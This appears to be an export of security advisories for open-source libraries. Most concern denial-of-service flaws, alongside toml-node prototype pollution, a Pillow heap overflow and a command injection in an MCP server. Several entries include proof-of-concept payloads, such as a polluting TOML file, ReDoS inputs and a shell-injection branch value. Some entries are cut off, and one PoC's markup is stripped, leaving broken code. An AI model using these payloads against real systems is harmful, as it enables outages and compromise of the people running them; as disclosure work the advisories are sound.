* Below the failure threshold there is a **silent band**: one streaming unpacker fed only an `array32` header with count 2×10⁷ (5 wire bytes, zero elements) grows used heap **+78 MiB immediately**, no exception (`each` swallows the underflow), and the footprint stays elevated after `Unpacker#reset` + full GC. Linear in declared count (~4 B/element); nothing bounds it — not delivered bytes, not a per-container cap.

Only counts ≥ 2³¹ are refused (a clean `MessagePack::UnderflowError` from `getUnsignedInt()`), and only **maps** are safe (`consumeHash` grows per element instead of pre-sizing). Verified on the released gem `msgpack 1.8.6 java`, JRuby 9.4.12 / OpenJDK 25, 2026-10-30 — i.e. **unfixed in the current release**. Proposed fix mirrors c8d42d8: cap initial allocation by bytes actually buffered and grow as data arrives; read strings in bounded chunks instead of allocating the declared length up front.


### Details

### 1. The four dispatch arms, and which pre-allocate (line numbers at tag v1.8.6 — current release; `ext/java` has no commits after it)

| header | dispatch ([Decoder.java](https://github.com/msgpack/msgpack-ruby/blob/v1.8.6/ext/java/org/msgpack/jruby/Decoder.java)) | behaviour on the declared count | measured (released 1.8.6-java, Xmx512m) |
|---|---|---|---|
| `array32` `\xdd` | [:296](https://github.com/msgpack/msgpack-ruby/blob/v1.8.6/ext/java/org/msgpack/jruby/Decoder.java#L296) → [`consumeArray(int size)` :139-145](https://github.com/msgpack/msgpac

advisories.summary: OpenTelemetry Python API: Denial of service through quadratic-time traceparent parsing
advisories.description:
## Summary

`TraceContextTextMapPropagator.extract()` in `opentelemetry-api` is vulnerable to regular expression denial of service (ReDoS) when processing a specially crafted `traceparent` value.

A malformed value containing a trace-context prefix followed by a long whitespace sequence and an embedded newline triggers quadratic-time regex backtracking. Applications that extract trace context from untrusted carriers accepting such strings can experience excessive CPU consumption and request-processing delays.

When extraction runs on an asynchronous server’s event-loop thread, a single malicious message can delay unrelated requests handled by that event loop.

## Exposure conditions

Exploitation requires attacker-controlled input to reach the affected propagator through a carrier that preserves embedded newlines and permits a sufficiently large value.

Conforming HTTP header values cannot contain embedded newlines. However, OpenTelemetry carriers are not restricted to HTTP headers. JSON strings can contain escaped newlines that become newline characters after decoding.

MCP request metadata is one relevant integration path: applications may extract trace context from JSON `params._meta`. Exposure depends on the MCP SDK or instrumentation version, whether extraction invokes the W3C Trace Context propagator, and applicable message-size limits. HTTP header validation does not constrain a `traceparent` string carried inside a JSON body.

Authentication requirements depend on the application exposing the carrier.

## Impact

The demonstrated impact is denial of service through excessive CPU consumption and blocked request processing. Repeated malicious messages may sustain service degradation.

This finding does not demonstrate data disclosure, data modification, or code execution.

## Remediation

Upgrade `opentelemetry-api` to `1.45.2` or a later release containing the fix.

Version `1.45.2` rejects `traceparent` values longer than 512 characters before regex matching and removes the overlapping suffix and trailing-whitespace expressions.

Where upgrading is temporarily unavailable, reject oversized values and embedded CR/LF characters before passing untrusted trace-context values to the affected propagator.

advisories.summary: toml-node: Prototype pollution: parsing a TOML document can write to Object.prototype
advisories.description:
### Summary
CVE-2026-63376 described prototype pollution through __proto__ key-path desynchronization and was fixed in 4.1.2 by rewriting the path bookkeeping and adding an ownedContainers WeakSet. The desynchronization is still reachable, spelled with a quote character instead of a dot, and the owned-container check is not applied on the path that matters.

A four-line TOML document parsed with toml.parse() writes a property onto Object.prototype, where it is visible to every object in the process — including objects produced by unrelated libraries.

### Details
Three gaps compose. All line numbers are `lib/compiler.js` in 5.0.0.

**1. The path-key encoding is ambiguous.** `quoteDottedString()` quotes a segment only when it contains a `.`, and never escapes a `"` inside the segment:

```js
287:  function quoteDottedString(str) {
288:    if (str.indexOf(".") > -1) {
289:      return "\"" + str + "\"";
290:    } else {
291:      return str;
292:    }
293:  }
```

So the key path `['x.y']` and the key path `['"x', 'y"']` both render as the string `"x.y"`. This is the same desynchronization CVE-2026-63376 named, with a quote in place of the dot.

**2. A table-array header can clear another key's guard.** `addTableArray()` walks `assignedPaths` / `valueAssignments` with `isSameOrSubPath()` over those ambiguous strings, so a header whose rendered path collides with an unrelated key deletes that key's entry.

**3. The descent in `assign()` has no owned-container check.** `deepRef()` applies `isOwnedContainer()` only to intermediate segments (`lib/compiler.js:265`, `:273`) and returns the final container unchecked. `assign()` then walks it with only a shape test:

```js
 93:      target = target[k];
...
103:    target[lastKey] = reduced;
```

A TOML datetime is a `Date`. It satisfies `typeof target[k] === "object"` and is not an array, so the walk descends into it — and a `Date` has a live prototype chain to `Object.prototype`.

Putting the three together, a document can make the current table a `Date` and then walk `__proto__.__proto__` to `Object.prototype`.

mkdir poc && cd poc && npm init -y >/dev/null && npm install toml@5.0.0

# poc.toml
"b.c" = 1979-05-27T07:32:00Z

["b.c"]
__proto__.__proto__.polluted = "yes"
```

Line 2 is a table-array header whose rendered path collides with it, clearing its guard.

advisories.summary: mail-parser is vulnerable to polynomial ReDoS in email header parsing
advisories.description:
### Summary

Two regular expressions used while parsing email headers backtrack
polynomially on attacker-controlled input. Parsing a single small, well-formed
email can consume minutes to hours of CPU, denying service to any process that
parses untrusted mail.

Both are reachable from an ordinary `parse_from_string()`, `parse_from_bytes()`
or `parse_from_file()` call — no special API, option, or malformed structure is
required by the victim.

### Details

**1. Address-header fallback regex (`src/mailparser/utils.py`)**

`get_addresses()` falls back to `_ADDR_FALLBACK_RE` whenever
`email.utils.getaddresses(strict=True)` yields no usable address. The
alternative `([^<,]*?)\s*<([^>]+)>` overlaps a lazy quantifier with an adjacent
`\s*` — a space matches both. Driven by `finditer`, which retries at every
offset and rescans the remainder, matching degrades to **quadratic** on `<`
padding and **cubic** on whitespace padding.

The fallback engages on the feature's own happy path, e.g.
`From: alice@example.com <bob@example.com>`.

Measured (4.6.0, CPython 3.14, macOS arm64; reproduced identically on Linux and
on CPython 3.9, 3.11, 3.12, 3.13):

| Padding                | Parse time         |
| ---------------------- | ------------------ |
| valid address + 750 sp | 0.38 s             |
| + 1500 sp              | 2.97 s             |
| + 3000 sp              | 23.4 s (×7.9/2×)   |
| + 6 KB sp              | 185 s              |
| ~100 KB sp             | hours              |

Fully RFC 5322-compliant folded headers (all lines ≤ 71 octets) trigger the same
blowup, so the input passes normal MTA and library checks. ~100 KB of headers is
within Postfix's default `header_size_limit = 102400`.

All six address headers parsed by the library (`From`, `To`, `Cc`, `Bcc`,
`Reply-To`, `Delivered-To`) are affected and their cost adds up linearly.

**2. Received-header clause splitter (`src/mailparser/const.py`)**

`parse_received()` splits on `_CLAUSE_SPLITTER`,
`(?:^|\s+)(from|by|via|with|id|for|envelope-from)\s+`. Under `re.split` this
backtracks **quadratically** over any whitespace run that is not followed by a
clause keyword. The pre-existing normalization collapsed only `[\t\n]`, so
literal spaces — including folded-header padding — reached the splitter intact.

Measured: 24 000 spaces in one `Received:` header → 22 s; ~100 KB → minutes.

gateway, ticketing system, quarantine UI, or

advisories.summary: Soup Sieve: General sibling combinator inside :has() matches untrusted HTML in quadratic time
advisories.description:
## Summary Matching a selector that puts a general-sibling combinator inside `:has()`, such as `div:has(a ~ b)`, against untrusted HTML runs in O(n²) time in the number of sibling elements. A single small document with a few thousand siblings ties the process up for a minute of CPU, so an application that runs a fixed selector of this shape over HTML it doesn't control can be stalled by one request. `:has` is powerful, but much in the same way poor regular expressions can be crafted to cause catastrophic backtracking with greedy capturing, has can be used to create non-ideal scenarios that can cause large portions of the tree to be evaluated for one or many elements if not used thoughtfully. This behavior is not exclusive to Soup Sieve, but browsers make note of these potential performance issues themselves: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Selectors/:has#performance_considerations. With all of that said, there is room for improvements that can in some cases greatly improve performance. ## Details `:has(a ~ b)` asks "does this element contain an `a` that has a later sibling `b`?". When no `b` is present, soupsieve can't short-circuit, and it answers the question with a nested scan: `match_future_child` walks every candidate `a` under the scope, and for each one the general-sibling branch of `match_future_relations` walks all of that `a`'s following siblings looking for `b`. With n siblings that is (n-1) + (n-2) + ... + 1 comparisons, i.e. O(n²). The adjacent-sibling form `div:has(a + b)` stays linear, because its branch checks only the one immediately following sibling per candidate. So the cost is specific to the general-sibling `~` (and `~` nested inside `:has`), and it shows up on the common case where the right-hand side simply isn't there. ## Proof of concept Installed from PyPI: `pip install soupsieve==2.9.2 beautifulsoup4`. ```python import time import soupsieve from bs4 import BeautifulSoup selector = "div:has(a ~ b)" for n in (1000, 2000, 4000, 8000): html = "
" + ("" * n) + "
" soup = BeautifulSoup(html, "html.parser") start = time.perf_counter() soupsieve.select(selector, soup) print(n, round((time.perf_counter() - start) * 1000), "ms") ``` Measured: ``` n=1000 837 ms n=2000 3667 ms n=4000 14797 ms n=8000 59746 ms ``` Time quadruples for each doubling of n. advisories.summary: NLTK: Quadratic CPU exhaustion in TreebankWordTokenizer.span_tokenize via list.pop(0) in quote-restore loop
advisories.description:
## Summary

`TreebankWordTokenizer.span_tokenize` in the NLTK tokenizer package contains an unguarded O(n^2) processing loop in its quote-restoration step. When the method is invoked on text containing a long run of double-quote characters (for example `'"' * n`), it performs a `list.pop(0)` operation once per quote token, and because `list.pop(0)` is O(length), the total cost grows with the square of the input length. An attacker who can supply untrusted text to this public span-tokenization API can force a single request to saturate one CPU core for a prolonged period, degrading availability. No authentication, special configuration, or user interaction is required.

## Root Cause

Inside `span_tokenize`, when the input contains double or repeated quotes, the code builds `matched`, a list with one entry per quote occurrence, and then reconstructs tokens in a comprehension that calls `matched.pop(0)` for each token that is a quote. Removing the first element of a Python list is an O(len(list)) operation because all remaining elements are shifted. For an all-quote input the tokenizer produces n quote tokens and `matched` has n entries, so `pop(0)` is called n times, each time on a list of shrinking but still linear length, giving cumulative O(n^2) CPU work. The violated invariant is bounded per-input work: there is no length cap on `span_tokenize` or the underlying `tokenize`, so untrusted input length translates into quadratic processing time. The neighboring `align_tokens` call is linear and is not the quadratic term.

```text
Affected function: TreebankWordTokenizer.span_tokenize
Source: nltk/tokenize/treebank.py
  - branch selector at line 203
  - matched list built at line 205
  - quadratic sink matched.pop(0) at line 209
  - linear align_tokens call at line 215
```

## Impact

An attacker who controls text passed to `TreebankWordTokenizer.span_tokenize` can trigger quadratic CPU work. In the reviewed release, an all-quote input of 128,000 characters takes about 1.76 seconds and 256,000 characters about 6.57 seconds on a single core, with cost growing as the square of the length. Memory use is linear. The demonstrated capability is single-core CPU exhaustion producing denial of service or latency degradation in any network-reachable component that uses span tokenization on untrusted input, such as offset, annotation, or highlighting pipelines. There is no confidentiality or integrity impact. The plausible operational consequence, where multiple concur

advisories.summary: gopacket: SCTP chunk sub-decoder out-of-bounds panics on crafted segments
advisories.description:
## Summary

gopacket decodes SCTP (IP protocol 132) by walking the chunk chain through per-chunk-type decoder functions (`decodeSCTPInit`, `decodeSCTPShutdown`, `decodeSCTPError`, `decodeSCTPSack`, in `layers/sctp.go`). Each of these reads fixed-size header fields and runs count-driven loops **without validating the chunk's declared length against the minimums those reads require**. A single crafted SCTP segment causes a runtime panic (out-of-bounds slice read, or inverted slice from unsigned length arithmetic) on any decode path that does not install gopacket's per-packet panic recovery (`gopacket.DecodeOptions.SkipDecodeRecovery: true`); with the default API the same input degrades to a per-packet decode error.

The defect is present in every released version through `v1.7.1` and at current `master` (18c5805). It is the SCTP component named - but not remediated - in CVE-2026-65819 (`GHSA-8mcr-459q-5mx2`, "Multiple layer decoders panic …", patched per advisory metadata in `v1.7.1`). The `v1.7.1` hardening commit `b772f56` ("layers:various: add protocol decoder length checks (#163)") added generic bounds to the chunk dispatcher and `decodeSCTPChunk`, but left every chunk *sub-decoder* without a per-type minimum-length check. The advisory's own description lists "SCTP chunk/parameter decoders (`sctp.go`)" among items "being confirmed; they should be remediated together with the above" - this report demonstrates that, at `v1.7.1` and `HEAD`, that remediation still does not exist.

## Patches

Fixed in **v1.7.2** by commit [`5080443`](https://github.com/gopacket/gopacket/commit/5080443) ("layers/sctp: bound chunk sub-decoders and parameters"). INIT/INIT-ACK, SACK and SHUTDOWN now check their chunk type's minimum length, SACK rejects gap-ack and duplicate-TSN counts the chunk can't hold, and `decodeSCTPParameter` rejects TLV lengths below 4 or beyond the buffer. Each case returns a decode error instead of panicking. The same commit fixes a panic on valid input, where a final parameter's padding lies outside the chunk length (RFC 9260 3.2). Regression tests: `TestDecodeSCTPChunkRegression` and `TestDecodeSCTPParameterPadding` in `layers/decode_oob_test.go`.

Upgrade with `go get github.com/gopacket/gopacket@v1.7.2`.

## Workarounds

Before v1.7.2, keep panic recovery on: use `gopacket.NewPacket` without `SkipDecodeRecovery`, and `DecodingLayerParser` with `IgnorePanic: false`. The crafted packet then fails to decode instead of crashing the process.

advisories.summary: pgAdmin 4 server mode has an authorization vulnerability affecting Server Groups, Servers, Shared Servers, Background Processes, and Debugger modules
advisories.description:
Authorization vulnerability in pgAdmin 4 server mode affecting Server Groups, Servers, Shared Servers, Background Processes, and Debugger modules.

Multiple endpoints fetched user-owned objects without filtering by the requesting user's identity. An authenticated user could access another user's private servers, server groups, background processes, and debugger function arguments by guessing object IDs.

Additionally, the Shared Servers feature contained multiple issues including credential leakage (passexec_cmd, passfile, SSL keys), privilege escalation via writable passexec_cmd (a shell command executed when establishing the connection) allowing arbitrary command execution in the owner's process context, and owner-data corruption via SQLAlchemy session mutations. Several owner-only fields (passexec_cmd, passexec_expiration, db_res, db_res_type) were writable by non-owners through the API, and additional fields (kerberos_conn, tags, post_connection_sql) lacked per-user persistence so non-owner edits mutated the owner's record.

Fix centralises access control via a new server_access module, scopes all user-owned models with a UserScopedMixin, returns HTTP 410 from connection_manager when access is denied in server mode, suppresses owner-only fields for non-owners across the merge / API response / ServerManager paths, and adds an explicit owner-only write guard. The remediation landed in two pull requests; both are referenced.

This issue affects pgAdmin 4: before 9.15.

advisories.summary: Forge: TLS client crash on an unsupported ServerHello compression method
advisories.description:
### Summary
A `forge.tls` client accepts any compression method in the ServerHello, although it only offers no compression. An unknown method makes `connection.process()` throw an uncaught `Error` when the client handles ServerHelloDone, before the server is authenticated. A malicious server or an on-path attacker can use this to terminate a Node.js process. Fixed in node-forge 1.4.3.

### Details
The client's ClientHello offers only the `null` compression method. `tls.parseHelloMessage()` in `lib/tls.js` stores the ServerHello's `compression_method` for the client without checking it (the code has a `TODO: handle compression methods`). When the client handles ServerHelloDone it calls `tls.createConnectionState()`, which throws `Error('Unsupported compression algorithm.')` for any method other than `null` (0) and `deflate` (1). The exception propagates out of `connection.process()`.

The ServerHello isn't authenticated until the server's Finished message, so an on-path attacker can change the compression byte of a genuine ServerHello; the certificate chain still verifies. Applications that pass socket data to `process()` without catching exceptions terminate. This includes `forge.tls.wrapSocket`, which calls `process()` from its socket data handler, and `forge.http`, which uses it. A `deflate` (1) method, also never offered, makes the handshake fail later with an error instead of a crash.

Servers are not affected: a server always selects no compression.

The fix fails the handshake with an `illegal_parameter` alert, through the connection's `error` callback, when the ServerHello selects any compression method other than `null`.

#### Patches
Fixed in node-forge 1.4.3.

#### Workarounds
Catch exceptions thrown by `connection.process()` and close the socket.

#### Resources
- RFC 5246, section 7.4.1.3 (Server Hello): https://www.rfc-editor.org/rfc/rfc5246#section-7.4.1.3
- Related: GHSA-525v-9gp9-w22h (another TLS client crash during the handshake, fixed in 1.4.1): https://github.com/digitalbazaar/forge/security/advisories/GHSA-525v-9gp9-w22h

#### Credits
Reported by @alienkeric.

advisories.summary: fast-xml-parser: Quadratic CPU consumption scanning unterminated stop-node tags
advisories.description:
### Summary

With the non-default stopNodes option, a stop node's body with many "<a " fragments and no closing ">" anywhere after makes readStopNodeData() rescan the entire remaining input from every "<". The failed lookahead is neither cached nor bounded, so n fragments cost O(n²) before the parser throws. Availability-only (CPU exhaustion), needs the non-default stopNodes option — not benchmarked yet, see Proof of Concept.

### Details

**CWE-407** — Inefficient Algorithmic Complexity

**Code**
- `OrderedObjParser.js:520` — `parseXml()` calls `readStopNodeData()` after a matching stop node opens
- `OrderedObjParser.js:810` — calls `readTagExp()` for every non-special `<`
- `OrderedObjParser.js:688-722` — `tagExpWithClosingIndex()` scans to end-of-input and returns `undefined` when no `>` exists
- `OrderedObjParser.js:812-818` — on failure, `i` isn't advanced, so the next `<` repeats the same full scan
- `OrderedObjParser.js:423` — the main parse loop throws immediately on the same failure; only the stop-node path retries

**Root cause:** a failed closing-`>` lookahead is neither cached nor bounded — `n` copies of `<a ` with no later `>` means `n` scans over the remaining input, O(n²) work, before it finally throws.

**Fix**
1. Throw immediately in `readStopNodeData()` when `readTagExp()` returns `undefined`
2. Or break the loop on the first failed scan
3. Or find the next `>` once and reuse/bound that result
4. Add a test asserting near-linear scaling when payload size doubles

### Proof of concept

Not benchmarked — static-analysis finding, confidence 0.5.

To confirm: configure `stopNodes` matching a root element. Build input as `'<stop>' + '<a '.repeat(n)`. Time `parse()` until it throws `Unexpected end of <tag>`. Start around n=10,000 and double it — quadratic should show ~4x time per doubling, linear ~2x. Control: same input with a `>` present, or `stopNodes` unset.

### Impact

CPU-exhaustion DoS in Node.js services parsing untrusted XML with `stopNodes` enabled. A ~100KB payload is estimated at ~10⁹ character operations (roughly a second or more of blocked event loop) — analytical estimate, not a benchmark. No confidentiality/integrity impact. CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` (3.7, Low).

packages.note: fast-xml-parser: Quadratic CPU consumption scanning unterminated stop-node tags

advisories.summary: rails-html-sanitizer: Possible regular expression denial of service with certain configurations
advisories.description:
## Summary

`Rails::HTML::PermitScrubber` restricts the `href` and `xlink:href` attributes of SVG reference elements to local references. That check matched the attribute value against `/^\s*[^#\s].*/m`. In Ruby `^` anchors to every line start and `\s` matches newlines, so an all-whitespace value made the engine rescan the value from each of its line starts, taking time quadratic in its length.

- Versions affected: `>= 1.0.3, < 1.7.2`
- Not affected: `< 1.0.3`
- Fixed versions: `1.7.2`

Only Ruby 3.1 and earlier are affected. Ruby 3.2 added linear-time regexp matching, which makes the pattern linear.

## Impact

An attacker who supplies HTML to be sanitized can consume CPU out of proportion to the input size, by sending an SVG reference element whose `href` or `xlink:href` is a long run of whitespace.

Applications are affected only when the allowed tags are overridden to include an SVG reference element such as `use`, along with `href` or `xlink:href` in the allowed attributes. The default allowed tags include no SVG elements, so the default configuration is not affected. Applications that use Loofah directly are exposed through its own copy of the check, fixed in Loofah 2.25.3.

## Workarounds

Run Ruby 3.2 or later, which matches the pattern in linear time, or remove the SVG reference elements from the overridden allowed tags.

## Credit

Reported by scyoon through the Rails HackerOne program.

advisories.summary: Pillow: Heap buffer overflow saving TIFF with libtiff when tags override image size
advisories.description:
```
============================================================================
ANT-2026-CS7N494P  [high]  CWE-787  memory-safety
Heap buffer overflow saving TIFF with libtiff when tags override image size
Location: src/libImaging/TiffDecode.c:1035  in ImagingLibTiffEncode()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

When Pillow saves an image as a compressed TIFF, size information taken from the image's metadata can make the encoder read past the end of a heap buffer. Someone who uploads an image can use this to get the server process's memory, including pointers, copied into the saved file, or to crash the process. When the metadata also enables TIFF "Predictor=2" compression, the encoder writes past the buffer instead, corrupting the heap and aborting the process. This affects applications that write TIFF through libtiff (any `compression=` other than raw) and either carry the source metadata across with `exif=im.getexif()` / `tiffinfo=`, or simply re-save a crafted palette TIFF with `Image.open(f).save(out, "TIFF")`, which inherits its compression and predictor from the upload.

In `TiffImagePlugin._save`'s libtiff branch, only `BitsPerSample` is pinned to the real image when the tag list for the encoder is built (`src/PIL/TiffImagePlugin.py:1955`). `ImageWidth`, `ImageLength` and `PlanarConfiguration` are set from `im.size` but are then overwritten by the `exif=`/`tiffinfo=` merge loop at `:1768-1772`. `SamplesPerPixel` is never set for single-band modes, so a value from the caller's tags or from the source TIFF's own IFD reaches `TIFFSetField`. `ImagingLibTiffEncode` then passes a row buffer sized from the actual image (`src/encode.c:291`) to `TIFFWriteScanline` (`src/libImaging/TiffDecode.c:1035`) with no check against `TIFFScanlineSize()`, and libtiff consumes a full scanline of the tag-described width from it.

The attached reproducer demonstrates the read case. A 64x4 greyscale JPEG whose EXIF says `SamplesPerPixel=3, Photometric=RGB` is converted into a valid RGB TIFF in which 128 bytes of each row are live heap, including pointers that change from run to run. The same JPEG with EXIF `ImageWidth=2**27` kills the process with SIGSEGV. For the write case, the values written are byte-wise differences of existing heap contents rather than attacker-chosen data, and nothing beyond the observed glibc abort is shown. The `tiffinfo=` route dates back to Pillow 2.3.

advisories.summary: @hono/node-server: Unhandled `ECONNRESET` on the socket during an asynchronous WebSocket upgrade crashes the process
advisories.description:
### Summary

While `@hono/node-server` waits for the Hono application to handle a WebSocket upgrade request, the socket has no error listener. If the client resets the TCP connection during that time, the resulting `ECONNRESET` is emitted as an unhandled `'error'` event and the process terminates.

### Details

The upgrade handler awaits the application before attaching any listener to the socket. When middleware on the upgrade path does asynchronous work, such as an authentication lookup, a connection reset in that window has no handler. If a global `uncaughtException` handler swallows the error, the pending upgrade is never released and its entry is retained for the lifetime of the process.

The fix attaches error and close listeners to the socket before calling the application, releases the pending upgrade when the socket closes, and skips the handshake on a destroyed socket.

### Impact

An unauthenticated client can terminate the server process with a single connection by sending a WebSocket upgrade request and resetting the connection before the application has responded. Where the crash is suppressed, repeated requests grow the heap.

This affects applications that enable WebSocket support in `@hono/node-server` and run asynchronous middleware or handlers on the upgrade path.

advisories.summary: pgEdge RAG Server unbounded corpus read allows resource exhaustion from unauthenticated requests
advisories.description:
### Impact

An unauthenticated caller able to reach the query endpoint could exhaust database and server resources with ordinary, inexpensive requests.

The keyword-search arm read the entire corpus on every request and rebuilt an in-memory BM25 index from it, so the cost of serving a query scaled with the size of the source table rather than with the size of the result set. Each request cost the server and the tenant's database far more than it cost the caller to make, which makes this a materially more effective denial-of-service lever than flooding the endpoint with ordinary requests. The amplification factor grows with corpus size, so the largest deployments are the most exposed.

Hybrid search was enabled by default and configured per pipeline rather than per request, so a caller could not opt out of the keyword arm and an operator could not leave it available to some requests but not others.

**Who is affected:** any deployment of pgEdge RAG Server at `1.0.0` or earlier, including all alpha and beta pre-releases, whose query endpoint is reachable by an untrusted party. The endpoint required no authentication and applied no rate limiting.

In `1.0.0`, `internal/database/search.go:130` built the corpus query with no `LIMIT`:

```go
query = fmt.Sprintf(`
    SELECT ...
    FROM %s%s`,
    tableIdent,
    filterClause)
```

`FetchDocuments` accepted no limit parameter at all, so neither a caller nor the orchestrator had any way to bound the read.
`internal/config/loader.go:197` defaulted `HybridEnabled` to true, and `internal/server/middleware.go:37` applied only logging, panic recovery and optional CORS.

### Patches

**Fixed in `2.0.0`. Upgrade to `2.0.0` or later.**

Reads are capped by a new per-pipeline `search.bm25_max_documents`, defaulting to 10000, plumbed through `SearchBackend.FetchDocuments` and applied as a parameterised `LIMIT`. There is deliberately no unlimited value: a non-positive setting is rejected at configuration load time rather than silently treated as unbounded.

Requests that reach the cap are logged, because keyword recall is partial at that point and an operator should not have to infer it. A new `disable_hybrid` request field lets a caller skip the expensive arm per query, and can only ever turn it off.

**After upgrading, review the default `search.bm25_max_documents` value of 10000 against the size of your corpus.** A cap far below corpus size silently reduces keyword recall.

advisories.summary: OpenTelemetry-Go: Eager W3C baggage-property materialization causes bounded memory-allocation amplification
advisories.description:
## Summary

OpenTelemetry Go eagerly materializes W3C baggage metadata into property objects during parsing. Slice growth, serialization, and copying into the internal representation cause **bounded but disproportionate memory-allocation amplification** for a valid, densely populated header. In v1.46.0 and v1.47.0-rc.1, the 8,192-byte raw-input limit is checked before member parsing; this is not unlimited allocation or a bypass of that limit.

A valid 8,191-byte value containing one member and 4,094 properties causes approximately 778 KB of cumulative allocation per parse. A corrected measurement with forced garbage collection before and after parsing retains approximately 164 KB per result while it remains live. These are different metrics: approximately 95 times the input in allocation traffic versus approximately 20 times in incremental live heap in the measured environment.

The relevant security configuration is a service that enables Baggage propagation and extracts attacker-controlled inbound context before authentication or on a public route. Concurrent or sustained requests can increase allocation and GC pressure. The evidence establishes allocation amplification, but does not establish reliable OOM, process termination, or complete denial of service.

This is a **pre-existing, independent allocation-amplification path not addressed by GHSA-5wrp-cwcj-q835 / CVE-2026-41178**. It predates that advisory; it is not described as having been introduced by its fix.

## Affected module, versions, and symbols

- Go module: `go.opentelemetry.io/otel`.
- Import paths and entry points: `go.opentelemetry.io/otel/baggage.Parse` and `go.opentelemetry.io/otel/propagation.Baggage.Extract`.
- Implementation: `parseMember`, property-slice growth and serialization, and conversion into `internal/baggage.Item`.
- Source history places the eager-property implementation at commit `4bf6150fa94e18bdf01c96ed78ee6d1c76f8e308`, first included in `v1.0.0-RC1`; the stable release line starts at `v1.0.0`.
- Affected release range: `>= 1.0.0-RC1, < 1.47.0`.
- Patched release: `v1.47.0` (https://github.com/open-telemetry/opentelemetry-go/pull/9024), which validates and normalizes W3C property metadata in place during `Parse` and materializes `Property` structs lazily only when `Member.Properties()` is explicitly called.
- Small parser measurements were run on `v1.0.0-RC1`, `v1.0.0`, `v1.46.0`, and `v1.47.0-rc.1`; this is not a claim to have dynamically tested every intervening rel

advisories.summary: code-review-mcp-server: Command injection via unsanitized folderPath/baseBranch parameters
advisories.description:
### Impact

`code-review-mcp-server` exposes MCP tools (`getLocalGitDiff`, `codeReview`, `createPR`, `getPRTemplate`) that accept `folderPath` and `baseBranch` string parameters. These caller-controlled values were interpolated directly into shell command strings executed via `child_process.execSync()`, which runs commands through `/bin/sh`.

A crafted value such as `baseBranch = "main; <arbitrary command> #"` (or a `$(...)` command substitution, or a `folderPath` that breaks out of the surrounding quotes) results in **arbitrary command execution** on the host running the MCP server.

### Patches

Fixed in **1.5.3**. Every `execSync()` call was replaced with `execFileSync()` using argument arrays, so inputs are passed directly to `git` / `gh` without going through a shell, eliminating the injection at its root.

### Workarounds

None. Upgrade to `code-review-mcp-server@1.5.3` or later.

advisories.summary: Soup Sieve: Exponential ReDoS in selector compilation via \9-run in CSS_ESCAPES/IDENTIFIER
advisories.description:
### Summary
The IDENTIFIER/CSS_ESCAPES regex (css_parser.py:119-124) exhibits exponential backtracking on a run of ambiguous digit-escapes (`\9`) in an attribute-name or tag position of an otherwise well-formed selector. It fires at compile time (before the SELECTOR_LIMIT guard) via the public `soupsieve.compile()` and BeautifulSoup `.select()`.

### PoC (verified on soupsieve 2.9.2)

    import soupsieve as sv
    sv.compile('[a' + '\\9'*26 + '=x]')   # ~57 bytes -> ~10s; ~16x time per +4 chars

### Novelty
Distinct from the patched GHSA-836r-... (VALUE regex) and GHSA-2wc2-... (comma-list) advisories, which are fixed in 2.9.2; this is a different regex/vector.

### Reachability
CSS selectors are usually developer-controlled, so exposure requires an application that compiles UNTRUSTED selector strings (web-scraping-as-a-service, no-code/query builders, user-defined extraction rules). Where selectors are user-supplied, a ~60-byte string hangs the worker.

### Note
This issue was fixed in version 3.0.0, which has been yanked from the PyPI registry. Use versions 3.0.2 and above to upgrade.

advisories.summary: Addressable: Regular Expression Denial of Service in templates with multiple variables
advisories.description:
### Impact

Within the URI template implementation in Addressable, templates that put several variables in one expression generate regular expressions vulnerable to excessive backtracking:

1. Expressions with any operator other than `+` and `#` (e.g., `{/owner,repo,ref}`, `{.a,b}`, `{a,b,c}`, `{;a,b,c}`). The values are joined by an optional separator, so a run of characters can be divided among the variables in O(n^k) ways for k variables.
2. Expressions with the `+` or `#` operators and many variables (e.g., `{+v1,v2,v3,v4,v5,v6,v7,v8,v9,v10}`). A failing match is exponential in the number of variables.
3. Several single-variable expressions next to each other (e.g., `{+a}{+b}{+c}` or `{a}{b}{c}`), which are polynomial in the input length.

When `Template#match` or `Template#extract` is called with a maliciously crafted URI, this can result in uncontrolled resource consumption, leading to denial of service. A three-variable path template such as `http://example.com/repos{/owner,repo,ref}` needs about 2 KB of input to occupy a thread for many seconds.

Users of the URI parsing capabilities in Addressable but not the URI template matching capabilities are unaffected. Users who only call `Template#expand` are unaffected.

### Affected Versions

This vulnerability affects Addressable >= 2.3.0 (note: 2.3.0 and 2.3.1 were yanked; the earliest installable release is 2.3.2), including 2.9.0. It is fixed in 2.9.1.

The vulnerability is exploitable on Ruby implementations whose regular expression engine backtracks without memoization: MRI Ruby < 3.2 and JRuby. The second form, many-variable `+` and `#` expressions, is also exploitable on MRI Ruby 3.2, which does not memoize a regular expression that contains possessive quantifiers, and 2.9.0 generates those for these operators. It is also exploitable on TruffleRuby 40.0, whose regular expression engine falls back to backtracking for them. MRI Ruby 3.3 and later are not affected by any form, because they memoize those regular expressions too. TruffleRuby 40.0 is not affected by the other two forms. Earlier TruffleRuby versions were not tested.

This has been confirmed on the following runtimes with Addressable 2.9.0:

| Runtime | Status |
|---------|--------|
| MRI Ruby 2.7 | Vulnerable |
| MRI Ruby 3.1 | Vulnerable |
| MRI Ruby 3.2 | Vulnerable |
| MRI Ruby 3.3 | Not affected |
| MRI Ruby 3.4 | Not affected |
| MRI Ruby 4.0 | Not affected |
| JRuby 9.4 | Vulnerable |
| JRuby 10.1 | Vulnerable |
| TruffleRuby 40.0
